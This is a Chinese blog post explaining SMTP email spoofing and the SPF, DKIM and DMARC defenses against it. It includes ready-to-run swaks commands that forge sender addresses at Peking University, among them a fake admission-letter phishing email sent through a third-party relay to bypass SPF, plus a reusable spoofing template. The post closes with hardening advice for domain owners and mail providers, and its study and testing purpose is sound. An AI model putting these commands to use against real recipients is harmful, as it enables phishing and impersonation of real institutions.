---
title: "浅谈电子邮件伪造"
slug: qian-tan-dian-zi-you-jian-wei-zao
cover: ""
date: 2026-01-09
categories:
  - 杂项
tags:
  - 电子邮件
halo:
  site: http://www.hzhsec.top
  name: 260b1afa-2968-400c-bf51-5cb61d7033ae
  publish: true
---

<!--more-->


# SMTP 简介

> 电子邮件协议主要包括 SMTP、POP3 和 IMAP。
>  SMTP（Simple Mail Transfer Protocol）是用于在客户端与服务器、以及服务器之间发送和转发电子邮件的应用层协议，本文聚焦 **SMTP 协议** 及其被伪造时的原理与防护。

## SMTP 大致通信过程

1. **建立连接**

- 客户端与服务器在 TCP 层建立连接，默认使用 25 号端口（另有 587/465 等常用端口用于提交/auth/加密）。
- 建立成功后，服务器发回 `220` 状态码，表示服务就绪。
- 客户端发送 `EHLO`（或 `HELO`）命令，告诉服务器自己的域名。
- 服务器回应 `250` 状态码，表示命令成功，并（在 `EHLO` 情况下）返回支持的扩展功能列表（如 `STARTTLS`、`AUTH` 等）。

1. **发送邮件**

- 客户端发送 `MAIL FROM:<发件人地址>`，指定邮件的发件人。
- 服务器返回 `250`，确认发件人地址合法（或接受该命令）。
- 客户端发送一个或多个 `RCPT TO:<收件人地址>`，指定收件人。
- 服务器对每个收件人均返回 `250`，确认其合法。
- 客户端发送 `DATA` 命令，服务器返回 `354`，提示可以开始输入邮件数据。
- 客户端逐行发送邮件头和正文，最后以单独一行的句点 `.` 结束输入。
- 服务器返回 `250`，表示邮件已成功接收并排队等待投递。

1. **关闭连接**

- 客户端发送 `QUIT` 命令，请求断开会话。
- 服务器返回 `221`，表示连接已正常关闭。

------

# 邮件伪造原理

在 SMTP 协议中，邮件的头部（例如 `From:`、`To:`、`Subject:`）是可以由发信方声明的，这就导致了伪造（spoofing）的可能性。下面给出一个示例邮件头与正文：

```
Date: Wed, 06 Aug 2025 14:57:55 +0800
To: example@example.com
From: 110@110.com
Subject: test Wed, 06 Aug 2025 14:57:55 +0800
Message-Id: <...>
X-Mailer: ...
Content-Type: text/html

This is a test
```

其中：

- `Message-Id`：消息 ID，用于区分邮件。
- `X-Mailer`：发送客户端/工具标识。
- `Subject`：邮件标题。
- `To`：收件人邮箱地址。
- `From`：发件人邮箱地址（可被任意伪装）。

因此，仅凭 `From` 字段并不能证明邮件来源的真实性，必须依靠后端的认证机制来验证来源。

------

# 防范机制（SPF / DKIM / DMARC）

为了解决邮件伪造问题，业界广泛采用了以下三种 DNS 记录/机制：

- **SPF（Sender Policy Framework）**：声明哪些主机/IP 被允许代表某一域发送邮件。通常以 DNS TXT 记录形式存在。
- **DKIM（DomainKeys Identified Mail）**：使用公/私钥对邮件进行签名；公钥放在 DNS 中，收件方用公钥验证签名以确认邮件未被篡改并确认为该域所签发。
- **DMARC（Domain-based Message Authentication, Reporting & Conformance）**：在 SPF 与 DKIM 之上提供策略和报告机制，告知收件方在验证失败时如何处理（reject/quarantine/none），并可接收送达/验证报告。

下面具体介绍 SPF 与其解析格式。

## SPF 简介与解析示例

**SPF** 通常以 DNS TXT 记录存在，示例：

```
v=spf1 ip4:192.0.2.0/24 include:_spf.example.com redirect=example.net -all
```

字段说明：

- `v=spf1`：协议版本，必须且且仅此。
- `ip4` / `ip6`：允许的 IP 段，例如 `ip4:192.0.2.0/24`。
- `a` / `mx`：允许与域名 A 记录或 MX 记录匹配的主机。
- `include:`：引入并复用其它域的 SPF 规则。
- `redirect=`：当本域所有机制都未匹配时，改去检查指定域的 SPF 记录。
- **限定符**：`+`（或无符号）＝ Pass，`-`＝ Fail（硬拒绝），`~`＝ SoftFail（标记可疑），`?`＝ Neutral（不处理）。
- `-all`：所有未匹配者硬拒绝（强制策略）。

------

# 实验：使用 swaks 构造与发送测试邮件

`swaks`（SMTP Swiss Army Knife）是一个用 Perl 编写的命令行工具，常用于测试 SMTP 服务器、验证配置和发送邮件。

### 安装

```bash
apt install swaks
```

### 查询 SPF（示例）

```
nslookup -type=TXT gmail.com
```

![[屏幕截图 2025-10-09 144157.png]]

示例中可以看到 Gmail 的 SPF 记录。很多临时邮箱/服务没有 SPF，找一个临时邮箱示例：

```
nslookup -type=TXT mailshan.com
```

![[屏幕截图 2025-10-09 144607.png]]

如果没有 SPF 记录，则更容易被伪造发送。

### 构造并发送伪造邮件

```bash
swaks \
  --from    "admin@mail.pku.edu.cn" \
  --to      "example@gmail.com" \
  --ehlo    "pku.edu.cn" \
  --header  "X-Mailer: Gmail" \
  --header  "Content-Type: text/html; charset=UTF-8" \
  --header  "Subject: test" \
  --body "test"
```

在测试中，Gmail 因为发送方 IP 不在授权列表中会拒收该邮件（可见服务器的 SPF 校验生效）。

另一个测试：给临时邮箱发送伪造邮件，因对方没有 SPF 记录，邮件能成功到达：

```bash
swaks \
  --from    "admin@mail.pku.edu.cn" \
  --to      "skunk31124@aminating.com" \
  --ehlo    "pku.edu.cn" \
  --header  "X-Mailer: Gmail" \
  --header  "Content-Type: text/html; charset=UTF-8" \
  --header  "Subject: test" \
  --body "hello_hzhsec"
```

![[屏幕截图 2025-10-09 145531.png]]

说明：若目标域未配置 SPF/DKIM/DMARC，伪造邮件更容易成功送达。

------

# SPF 绕过与代发机制

### 代发（使用 `--h-From`）

某些邮局/SMTP 提交服务器允许 `MAIL FROM` 与邮件头 `From:` 不一致（也就是允许代发/伪装头部），可以通过 `swaks` 的 `--h-From` 将邮件头 `From:` 指向你想伪造的地址，而 `--from` 则为你的真实登录账号：

```bash
swaks \
  --from "username" \
  --h-From    "admin@pku.edu.cn" \
  --to      "example@example.com" \
  --ehlo    "pku.edu.cn" \
  --header  "X-Mailer: Gmail" \
  --header  "Content-Type: text/html; charset=UTF-8" \
  --header  "Subject: 北京大学录取通知书" \
  --body @./test.html \
  --server smtp.qiye.aliyun.com \
  --au "username" \
  --ap "password"
```

参数说明：

- `--from`：真实发件人账号（用于登录 SMTP 服务器）。
- `--h-From`：邮件头中显示的 `From:`（可用于伪造）。
- `--server`：SMTP 服务器地址。
- `--au` / `--ap`：登录用户名与密码。
- `--body @file`：从文件读取邮件正文。

使用代发机制，可利用合法 SMTP 服务代发内容，从而使得接收方更难直接通过简单检查识别伪造（例如邮件可能通过了 SMTP 连接端的反垃圾或信誉检查）。

示例中构造的钓鱼邮件具有较强的真实性感：

![[微信图片_20251009150125_40_8.jpg]]

------

# 发现与测试结论

- 发现某些 **网页邮箱不对发件域做严格的 SPF 校验**，导致可用伪造的 `From:` 地址成功发送邮件（实测可针对无 SPF 的域）。
- 对于存在 SPF 的域，利用 **子域** 或者**使用第三方合法 SMTP 代发**有时可以绕过简单的校验（取决于接收方对 SPF/DKIM/DMARC 的严格程度）。

示例：

- `pku.edu.cn` 主域与 `email.pku.edu.cn` 的 SPF 配置不同，子域策略可能导致某些绕过路径。

------

# 安全建议（面向域名所有者与收件方）

**域名所有者应：**

1. 为域配置严格的 SPF 记录（例如 `-all` 策略），并确保列出所有合法发送源。
2. 部署 DKIM：为发信系统签名，并把公钥发布在 DNS。
3. 配置 DMARC，并根据监控结果逐步收紧策略（从 `p=none` -> `p=quarantine` -> `p=reject`）。
4. 对子域设置明确策略（子域继承或单独设定），避免因子域未设置而被滥用。

**收件方 / 邮箱服务提供方应：**

1. 在收信阶段严格执行 SPF/DKIM/DMARC 验证，并对失败邮件采取合适策略（拒收或隔离）并生成报告。
2. 对通过第三方 SMTP（代发）且 `From` 与实际 `MAIL FROM` 不一致的邮件提高警惕，结合信誉、内容、历史行为做综合判定。

------

# 附：常用 swaks 命令模板

```bash
# 基本发送
swaks --from "me@example.com" --to "you@example.org" --server smtp.example.com --auth LOGIN --au "me" --ap "password" --body "hello"

# 代发（伪造邮件头）
swaks --from "real@me.com" --h-From "spoof@victim.com" --to "target@domain.com" --server smtp.provider.com --au "real@me.com" --ap "password" --body @./test.html
```

------

# 总结

SMTP 的基本通信流程、邮件伪造的原理，以及常见的防护机制（SPF、DKIM、DMARC）。通过 `swaks` 的实测可以看出：

- 若目标域没有配置 SPF/DKIM/DMARC，伪造邮件极易成功到达；
- 若目标域配置了严格的认证策略，伪造会被显著阻断，但仍存在代发或通过信任第三方 SMTP 绕过的风险；
- 最佳实践是域名所有者完善 SPF/DKIM/DMARC，同时邮件接收方严格执行验证并结合报告、信誉和内容策略一起判定可疑邮件。